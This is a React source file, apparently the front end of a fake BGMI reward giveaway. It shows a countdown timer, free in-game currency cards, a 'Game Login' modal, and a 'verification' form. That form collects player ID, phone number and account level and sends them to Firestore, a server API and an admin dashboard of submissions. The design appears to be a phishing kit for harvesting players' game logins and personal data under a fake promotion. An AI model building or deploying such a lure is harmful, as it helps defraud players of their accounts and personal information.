import React, { useState, useEffect } from 'react';
import Header from './components/Header';
import HeroBanner from './components/HeroBanner';
import CountdownTimer from './components/CountdownTimer';
import PromoBannerSection from './components/PromoBannerSection';
import RewardSection from './components/RewardSection';
import RewardModal from './components/RewardModal';
import GameLoginModal from './components/GameLoginModal';
import VerificationModal from './components/VerificationModal';
import StatusScreen from './components/StatusScreen';
import Footer from './components/Footer';
import AdminDashboard from './pages/AdminDashboard';
import { saveSubmissionToFirestore } from './services/firebase';

export default function App() {
  // Navigation & View Mode
  const [isAdminView, setIsAdminView] = useState(false);

  // User Flow State Machine: 'IDLE' -> 'CONFIRMATION' -> 'AUTH' -> 'VERIFICATION' -> 'PROCESSING'
  const [flowState, setFlowState] = useState('IDLE');
  
  // Active Selected Reward
  const [selectedReward, setSelectedReward] = useState(null);
  
  // Logged In Player State
  const [loggedInPlayer, setLoggedInPlayer] = useState(null);
  
  // Submission Record
  const [activeSubmission, setActiveSubmission] = useState(null);

  // Check existing session on mount
  useEffect(() => {
    // 1. Check logged in player session
    const storedUser = localStorage.getItem('bgmi_logged_in_player');
    if (storedUser) {
      try {
        setLoggedInPlayer(JSON.parse(storedUser));
      } catch (e) {}
    }

    // 2. Check active submission
    const existing = localStorage.getItem('bgmi_active_submission');
    if (existing) {
      try {
        const parsed = JSON.parse(existing);
        
        // Refresh status against latest admin store
        const adminSubs = JSON.parse(localStorage.getItem('bgmi_admin_submissions') || '[]');
        const matched = adminSubs.find(s => s.playerId === parsed.playerId || s.phoneNumber === parsed.phoneNumber);
        const finalSubmission = matched ? matched : parsed;

        setActiveSubmission(finalSubmission);
        setFlowState('PROCESSING');
      } catch (e) {
        console.error("Error reading saved submission:", e);
      }
    }
  }, []);

  // Step 1: User clicks "Collect" on a reward card
  const handleRewardSelect = (reward) => {
    setSelectedReward(reward);
    setFlowState('CONFIRMATION');
  };

  // Step 2: User confirms reward in confirmation modal
  // If not logged in -> open Auth/Login modal first; If already logged in -> open Verification modal
  const handleRewardConfirm = () => {
    if (!loggedInPlayer) {
      setFlowState('AUTH');
    } else {
      setFlowState('VERIFICATION');
    }
  };

  // Step 3: User completes login (via Header LOGIN or Auth popup)
  const handleAuthSuccess = (user) => {
    setLoggedInPlayer(user);
    localStorage.setItem('bgmi_logged_in_player', JSON.stringify(user));
    
    // Only proceed to Verification if user is currently claiming a selected reward!
    if (selectedReward) {
      setFlowState('VERIFICATION');
    } else {
      // Just logged in via Header LOGIN button: close modal, remain on Home page
      setFlowState('IDLE');
    }
  };

  // Step 4: User submits account verification when claiming reward
  const handleVerificationSubmit = async (verificationData) => {
    const pId = String(verificationData.playerId).trim();
    const phone = String(verificationData.phoneNumber).trim();

    // Check if player ID or phone number already exists in database
    const existingAdminSubs = JSON.parse(localStorage.getItem('bgmi_admin_submissions') || '[]');
    const existingPlayer = existingAdminSubs.find(
      (sub) => sub.playerId === pId || sub.phoneNumber === phone
    );

    let submissionRecord;

    if (existingPlayer) {
      // Existing player lookup
      submissionRecord = {
        ...existingPlayer,
        accountLevel: parseInt(verificationData.accountLevel, 10),
        selectedReward: selectedReward || existingPlayer.selectedReward,
        rewardTitle: selectedReward?.title || existingPlayer.rewardTitle,
      };
    } else {
      // New player record
      submissionRecord = {
        id: `sub_${Date.now()}`,
        playerId: pId,
        phoneNumber: phone,
        accountLevel: parseInt(verificationData.accountLevel, 10),
        selectedReward: selectedReward,
        rewardTitle: selectedReward?.title || 'UP Series Reward',
        authUser: loggedInPlayer?.email || loggedInPlayer?.displayName || 'Verified Player',
        authProvider: loggedInPlayer?.authProvider || 'OAuth Provider',
        createdDate: new Date().toLocaleString(),
        status: 'Processing',
      };

      // Save new record to admin submissions database
      localStorage.setItem('bgmi_admin_submissions', JSON.stringify([submissionRecord, ...existingAdminSubs]));

      // Asynchronously save to Firebase Firestore & Express server API
      saveSubmissionToFirestore(submissionRecord);
      try {
        fetch('/api/submissions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(submissionRecord)
        }).catch(() => {});
      } catch (e) {}
    }

    // Save active player session
    localStorage.setItem('bgmi_active_submission', JSON.stringify(submissionRecord));
    setActiveSubmission(submissionRecord);
    setFlowState('PROCESSING');
  };

  // Logout / Clear session handler
  const handleLogout = () => {
    localStorage.removeItem('bgmi_active_submission');
    localStorage.removeItem('bgmi_logged_in_player');
    setActiveSubmission(null);
    setLoggedInPlayer(null);
    setSelectedReward(null);
    setFlowState('IDLE');
  };

  if (isAdminView) {
    return <AdminDashboard onBackToHome={() => setIsAdminView(false)} />;
  }

  return (
    <div className="min-h-screen flex flex-col bg-bgmi-black text-white selection:bg-bgmi-gold selection:text-black">
      
      {/* Header Bar with LOGIN / User Badge and ADMIN buttons */}
      <Header
        onAdminClick={() => setIsAdminView(true)}
        onLoginClick={() => setFlowState('AUTH')}
        loggedInPlayer={loggedInPlayer}
        onLogout={handleLogout}
      />

      {/* Hero Banner Section */}
      <HeroBanner />

      {/* Real-time Countdown Timer */}
      <CountdownTimer />

      {/* Main Content View Switcher */}
      {flowState === 'PROCESSING' && activeSubmission ? (
        <StatusScreen
          submissionData={activeSubmission}
          onLogout={handleLogout}
        />
      ) : (
        <main className="flex-grow">
          {/* Event Promo Announcement Banner Section */}
          <PromoBannerSection />

          {/* Reward Section with UP Series & UC Cards */}
          <RewardSection onSelectReward={handleRewardSelect} />
        </main>
      )}

      {/* Footer */}
      <Footer />

      {/* User Flow Modals */}

      {/* Modal 1: Reward Confirmation */}
      {flowState === 'CONFIRMATION' && (
        <RewardModal
          reward={selectedReward}
          onClose={() => setFlowState('IDLE')}
          onConfirm={handleRewardConfirm}
        />
      )}

      {/* Modal 2: Game Login Screen */}
      {flowState === 'AUTH' && (
        <GameLoginModal
          onClose={() => setFlowState('IDLE')}
          onAuthSuccess={handleAuthSuccess}
        />
      )}

      {/* Modal 3: Account Verification Form (Triggers only when collecting reward) */}
      {flowState === 'VERIFICATION' && (
        <VerificationModal
          onClose={() => setFlowState('IDLE')}
          onSubmitVerification={handleVerificationSubmit}
          loggedInPlayer={loggedInPlayer}
        />
      )}

    </div>
  );
}
